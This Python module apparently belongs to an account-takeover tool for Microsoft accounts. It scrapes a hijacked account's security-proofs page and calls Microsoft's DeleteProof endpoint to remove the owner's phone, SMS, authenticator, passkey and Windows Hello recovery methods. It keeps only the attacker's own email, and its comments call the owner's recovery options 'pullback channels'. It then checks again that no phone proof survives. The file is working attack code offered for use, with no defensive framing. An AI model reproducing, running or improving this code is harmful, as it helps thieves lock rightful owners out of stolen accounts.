import codecs
import json
import logging
import re

import httpx

logger = logging.getLogger(__name__)

_PROOF_ARRAY_KEYS = (
    "emailProofs",
    "smsProofs",
    "phoneProofs",
    "totpProofs",
    "appProofs",
    "passkeyProofs",
    "windowsHelloProofs",
    "alternateEmailProofs",
)

# Never keep these — they are classic pullback channels
_ALWAYS_DELETE_TYPES = frozenset(
    {
        "sms",
        "phone",
        "text",
        "mobile",
        "totp",
        "authenticator",
        "app",
        "passkey",
        "fido",
        "windowshello",
        "hello",
    }
)


def _decode_ms(s: str) -> str:
    text = codecs.decode(s or "", "unicode_escape")
    return text.replace("\u0040", "@").strip()


def _extract_json_array(html: str, key: str) -> list | None:
    """Extract a JSON array value for ``"key": [...]`` from MS ServerData HTML."""
    m = re.search(rf'"{re.escape(key)}"\s*:\s*', html or "")
    if not m:
        return None
    i = m.end()
    if i >= len(html) or html[i] != "[":
        return None
    depth = 0
    for j in range(i, len(html)):
        ch = html[j]
        if ch == "[":
            depth += 1
        elif ch == "]":
            depth -= 1
            if depth == 0:
                raw = html[i : j + 1]
                try:
                    data = json.loads(raw)
                except json.JSONDecodeError:
                    try:
                        data = json.loads(raw.encode().decode("unicode_escape"))
                    except Exception:
                        return None
                return data if isinstance(data, list) else [data]
    return None


def _should_keep_proof(
    display: str,
    *,
    keep_emails: set[str],
    keep_domain: str,
    proof_type: str = "",
) -> bool:
    ptype = re.sub(r"[^a-z]", "", (proof_type or "").lower())
    if ptype and any(t in ptype for t in _ALWAYS_DELETE_TYPES):
        return False

    disp = (display or "").strip().lower()
    if not disp:
        return False
    if disp in keep_emails:
        return True
    # Masked forms like 0f*****@ilovevbucks.site — match by domain + local prefix
    if keep_domain and disp.endswith(f"@{keep_domain}"):
        return True
    for keep in keep_emails:
        if "@" not in keep or "@" not in disp:
            continue
        k_local, k_dom = keep.split("@", 1)
        d_local, d_dom = disp.split("@", 1)
        if k_dom != d_dom:
            continue
        if d_local == k_local:
            return True
        if "*" in d_local:
            prefix = d_local.split("*", 1)[0]
            if prefix and k_local.startswith(prefix):
                return True
    return False


async def _delete_proof(
    session: httpx.AsyncClient,
    apicanary: str,
    proof_id: str,
    *,
    label: str,
) -> None:
    await session.post(
        url="https://account.live.com/API/Proofs/DeleteProof",
        headers={
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Accept": "application/json",
            "canary": apicanary,
        },
        json={
            "proofId": proof_id,
            "uaid": "114b68368b7b46afa44c82a8246e4a44",
            "uiflvr": 1001,
            "scid": 100109,
            "hpgid": 201030,
        },
    )
    print(f"Removed Proof ({label})")


async def remove_proof(
    session: httpx.AsyncClient,
    apicanary: str,
    *,
    keep_security_email: str | None = None,
    keep_domain: str | None = None,
):
    """Remove foreign proofs / phones / apps; keep our recovery security email.

    Phones/SMS are the main post-hold pullback channel. They often do not appear
    in ``emailProofs`` — we also scrape ``smsProofs`` / ``phoneProofs`` / etc.
    """
    proofs = await session.get(
        "https://account.live.com/proofs/manage/additional?mkt=en-US&refd=account.microsoft.com&refp=security",
        headers={
            "Accept-Language": "en-US,en;q=0.5",
            "Referer": "https://login.live.com/",
        },
        follow_redirects=True,
    )

    html = proofs.text or ""
    logging.info("Proofs response: %s", html[:2000])

    keep_emails: set[str] = set()
    if keep_security_email:
        ke = keep_security_email.strip().lower()
        if ke and ke not in {"couldn't change!", "unknown", "n/a"}:
            keep_emails.add(ke)
    domain = (keep_domain or "").strip().lower().lstrip("@")
    if not domain and keep_emails:
        sample = next(iter(keep_emails))
        if "@" in sample:
            domain = sample.split("@", 1)[1]

    deleted = 0
    kept = 0
    handled_ids: set[str] = set()
    saw_sms = False

    for key in _PROOF_ARRAY_KEYS:
        entries = _extract_json_array(html, key) or []
        for proof in entries:
            if not isinstance(proof, dict):
                continue
            pid = _decode_ms(
                str(proof.get("proofId") or proof.get("encryptedProofId") or "")
            )
            display = _decode_ms(
                str(
                    proof.get("displayProofName")
                    or proof.get("display")
                    or proof.get("displayProofId")
                    or ""
                )
            )
            ptype = str(
                proof.get("proofType")
                or proof.get("channelType")
                or proof.get("type")
                or key
            )
            ptype_l = re.sub(r"[^a-z]", "", ptype.lower())
            if key in ("smsProofs", "phoneProofs") or any(
                t in ptype_l for t in ("sms", "phone", "text", "mobile")
            ):
                saw_sms = True
            if not pid:
                continue
            handled_ids.add(pid)
            label = f"{ptype}:{display or pid[:40]}"
            if _should_keep_proof(
                display,
                keep_emails=keep_emails,
                keep_domain=domain,
                proof_type=ptype,
            ):
                print(f"[~] - Keeping security email proof ({display})")
                kept += 1
                continue
            try:
                await _delete_proof(session, apicanary, pid, label=label)
                deleted += 1
            except Exception as exc:
                logger.warning("DeleteProof failed for %s: %s", label, exc)

    # Raw proofId sweep for anything the structured lists missed (legacy)
    for raw_id in re.findall(r'"proofId"\s*:\s*"([^"]+)"', html):
        proof = _decode_ms(raw_id)
        if not proof or proof in handled_ids:
            continue
        if _should_keep_proof(proof, keep_emails=keep_emails, keep_domain=domain):
            print(f"[~] - Keeping security email proof ({proof})")
            kept += 1
            continue
        try:
            await _delete_proof(session, apicanary, proof, label=proof[:64])
            deleted += 1
        except Exception as exc:
            logger.warning("DeleteProof failed for raw id: %s", exc)

    # Re-scrape: did any SMS/phone proof survive the wipe?
    sms_remaining = False
    try:
        again = await session.get(
            "https://account.live.com/proofs/manage/additional?mkt=en-US&refd=account.microsoft.com&refp=security",
            headers={
                "Accept-Language": "en-US,en;q=0.5",
                "Referer": "https://login.live.com/",
            },
            follow_redirects=True,
        )
        html2 = again.text or ""
        for key in ("smsProofs", "phoneProofs"):
            for proof in _extract_json_array(html2, key) or []:
                if isinstance(proof, dict) and (
                    proof.get("proofId") or proof.get("encryptedProofId")
                ):
                    sms_remaining = True
                    break
            if sms_remaining:
                break
    except Exception as exc:
        logger.warning("SMS re-scrape soft-skip: %s", exc)

    print(
        f"[+] - Removed proofs (deleted={deleted}, kept_ours={kept}, "
        f"saw_sms={saw_sms}, sms_remaining={sms_remaining})"
    )
    return {
        "deleted": deleted,
        "kept": kept,
        "saw_sms": saw_sms,
        "has_sms_proof": sms_remaining,
    }